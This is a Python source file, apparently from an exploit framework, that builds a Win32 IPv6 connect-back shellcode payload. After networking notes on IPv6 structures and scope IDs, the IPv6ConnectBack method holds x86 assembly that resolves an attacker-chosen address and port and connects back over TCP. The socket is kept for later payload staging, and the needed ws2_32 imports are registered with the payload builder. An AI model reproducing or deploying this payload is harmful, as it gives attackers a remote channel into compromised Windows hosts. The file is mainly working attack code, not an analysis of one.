#! /usr/bin/env python

# IPv6 payloads for Win32 platforms
#
# Dev Platform: Windows XP SP2

IPV6NOTES = """
These notes are a redux of the information at:
http://msdn2.microsoft.com/en-us/library/ms737937.aspx

The main idea for interchangable and portable IPv6 code on the
Windows XP is to use a new generic SOCKADDR structure that can
hold both IPv4 and IPv6.

It looks like:

    typedef struct sockaddr_storage {
        short ss_family;
        char __ss_pad1[_SS_PAD1SIZE];
        __int64 __ss_align;
        char __ss_pad2[_SS_PAD2SIZE];
    } SOCKADDR_STORAGE, *PSOCKADDR_STORAGE;

Members:

   ss_family: Address family (AF_INET/AF_INET6)
   __ss_pad1: 48bit pad for 64bit alignment
   __ss_align: Used by compiler for struct align
   __ss_pad2: Used by compiler for struct align

Details:

    With padding, the total size of the SOCKADDR_STORAGE structur
    is 128 bytes.

There's a couple of new functions that deal with IPv6. These functions
are aimed at making life easier by supporting both IP protocol
versions with complete transparency on Vista and some transparency on
Windows XP.

Most notably (see link for full details):

    WSAConnectByName (Vista only)
    WSAConnectByList (Vista only)
    Getaddrinfo function family (XP and up)
    Getnameinfo function family (XP and up)
    GetAdaptersAddresses (XP and up)


Scope ID notes: (from http://doc.trolltech.com)   
===============================================

The IPv6 scope ID specifies the scope of reachability for non-global 
IPv6 addresses, limiting the area in which the address can be used. All 
IPv6 addresses are associated with such a reachability scope. The scope 
ID is used to disambiguate addresses that are not guaranteed to be 
globally unique.

IPv6 specifies the following four levels of reachability:

* Node-local: Addresses that are only used for communicating with 
services on the same interface (e.g., the loopback interface "::1").

* Link-local: Addresses that are local to the network interface 
(link). There is always one link-local address for each IPv6 interface 
on your host. Link-local addresses ("fe80...") are generated from the 
MAC address of the local network adaptor, and are not guaranteed to be 
unique.

* Site-local: Addresses that are local to the site / private network 
(e.g., the company intranet). Site-local addresses ("fec0...") are 
usually distributed by the site router, and are not guaranteed to be 
unique outside of the local site.

* Global: For globally routable addresses, such as public servers on 
the Internet.

When using a link-local or site-local address for IPv6 connections, you 
must specify the scope ID. The scope ID for a link-local address is 
usually the same as the interface name (e.g., "eth0", "en1") or number 
(e.g., "1", "2").

IMPORTANT:

link local addresses are practically only used for neighbour discovery
. Things like dhcp etc.

Site local addresses also require a scope id, but the default scope id
is 1. Differing scope id's only come into play when you have more than
one site with the same address. So we default to a scope id of 1 on
any site local address unless specified otherwise!
    
"""

class win32ipv6:
    def __init__(self):
        return

    def IPv6ConnectBack(self, args):
        "Win32 IPv6 connectback payload"
        import urllib
      
        # base design
        IPv6Connect = """
        // The idea is to use the new getaddrinfo function
        // for the open and connect :)
        //
        // ADDRINFO *AI:
        // typedef struct addrinfo {
        //   int ai_flags; (0)
        //   int ai_family; (AF_INET6 = 23) 
        //   int ai_socktype; (SOCK_STREAM = 1)
        //   int ai_protocol; (IPPROTO_TCP = 6)
        //   size_t ai_addrlen; (0)
        //   char *ai_canonname; (NULL)
        //   struct sockaddr * ai_addr; (NULL)
        //   struct sockaddr * ai_next; (NULL)
        // } ADDRINFOA, *PADDRINFOA;
        //
        // Flow:
        //
        // 1. getaddrinfo(char *server, char *port, 0, &AI)
        // 2. s = socket(AI->ai_family, type, 6);
        // 3. connect(connsocket, AI->ai_addr, AI->ai_addrlen)
        // 4. return socket :)
      
        // XXX: we can also use hints in a seperate struct, see getaddrinfo docs
        // this would set hints to &AI and set a linked list of addrinfo structs
        // uncomment the muck below to enable and play with hints method ;)

        // room for AI struct, 32 bytes
        //xorl %eax,%eax
        //pushl %eax
        //popl %ecx
        //movb $8,%cl
        //ai_build:
        //pushl %eax
        //decl %ecx
        //jnz ai_build

        // &AI is in %edi
        //movl %esp,%edi

        // room for sockaddr, 128 bytes
        //movb $32,%cl
        //sockaddr_build:
        //pushl %eax
        //decl %ecx
        //jnz sockaddr_build

        // set family type in first short
        //movb $23,%cl
        //movw %cx,(%esp)

        // sockaddr to esi
        //movl %esp,%esi

        //xorl %ecx,%ecx
        //movb $23,%cl
        //movl %ecx,4(%edi) // ai_family = AF_INET6
        //movb $1,%cl
        //movl %ecx,8(%edi) // ai_socktype = SOCKSTREAM
        //movb $6,%cl
        //movl %ecx,12(%edi) // ai_protocol = IPPROTO_TCP
        //movb $128,%cl
        //movl %ecx,16(%edi) // ai_addrlen
        //movl %esi,24(%edi) // ai_sockaddr

        //int3

        // getaddrinfo call, strings are ascii
        // e.g. getaddrinfo("ip:v6:add:ress", "1234", 0, %edi)
        pushl %edi // &AI save pointer
        movl %esp,%esi 
        pushl %esi // *&AI, arg is ** res, pointer to pointer
        pushl %eax // 0 (or &AI if we want to provide hints, see docs semantics)
        leal port-geteip(%ebx),%eax
        pushl %eax
        leal address-geteip(%ebx),%eax
        pushl %eax
        call getaddrinfo-geteip(%ebx)

        popl %edi // eat saved pointer, filled in dest struct is now in %edi

        // XXX: error check here post-beta
      
        // socket call
        xorl %eax,%eax
        pushl %eax
        incl %eax
        pushl %eax // SOCK_STREAM
        pushl 4(%edi) // AF_INET6
        call socket-geteip(%ebx)
        pushl %eax
        popl %esi // socket to %esi

        // XXX: error check here post-beta

        //int3

        // connect call, socket to esi
        pushl 16(%edi) // AI->ai_addrlen
        pushl 24(%edi) // AI->ai_addr
        pushl %esi
        call connect-geteip(%ebx)

        //int3      

        jmp poststrings
        
        // testing strings
        address:
        .urlencoded "ADDRESS"
        .byte 0x00
        port:
        .urlencoded "PORT"
        .byte 0x00

        poststrings:

        // move socket to FDSPOT, do regular recv muck from here
        movl %esi,FDSPOT-geteip(%ebx)
        
        """

        # XXX: question? how do I get the fuggin' scope id .. hrmm

        # deal with SITE LOCAL semantics
        if "FEC0" in args["host"].upper()[:4]:
            if not "%" in args["host"]: # XXX: don't touch it if specifically set
                print "[!] adding a default site Scope ID of 1 for win32 IPv6 Connect Back ..."
                args["host"] = args["host"] + "%1"

        try:
          IPv6Connect = IPv6Connect.replace("ADDRESS", urllib.quote(args["host"]))
          IPv6Connect = IPv6Connect.replace("PORT", urllib.quote(args["port"]))
        except:
          print "[!] XXX: check your arguments to IPv6ConnectBack string:string !"
        
        self.imports += [ "ws2_32.getaddrinfo", "ws2_32.socket", "ws2_32.connect" ]
        self.longs += ["FDSPOT"]
        self.code += IPv6Connect

        return

    def IPv6Recycle(self, args):
        "Win32 IPv6 socket recycling"
        return

